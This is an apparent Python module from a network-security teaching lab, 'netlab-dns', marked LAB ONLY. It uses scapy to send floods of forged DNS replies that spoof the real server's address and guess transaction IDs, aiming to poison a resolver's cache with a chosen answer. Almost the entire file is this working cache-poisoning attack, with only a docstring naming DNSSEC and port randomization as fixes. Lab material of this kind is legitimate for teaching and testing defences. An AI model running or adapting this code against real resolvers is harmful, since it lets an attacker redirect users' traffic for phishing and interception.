# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-dns: race the resolver with forged replies. LAB ONLY.

Floods spoofed DNS answers (as if from the real server) guessing the transaction
ID, hoping to land one before the legitimate reply and poison the cache. Only
ever target a resolver you own; DNSSEC / port randomization (see resolver.py) fix
this.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    print(f"[*] racing resolver {args.resolver} for {args.qname} -> {args.answer}")
    for txid in range(args.txid_start, args.txid_start + args.count):
        pkt = (
            s.IP(src=args.server, dst=args.resolver)
            / s.UDP(sport=53, dport=args.dport)
            / s.DNS(
                id=txid,
                qr=1,
                qd=s.DNSQR(qname=args.qname),
                an=s.DNSRR(rrname=args.qname, rdata=args.answer),
            )
        )
        s.send(pkt, verbose=0)
    verdict("ALERT", f"sent {args.count} forged replies (txid guesses)")
    return 0
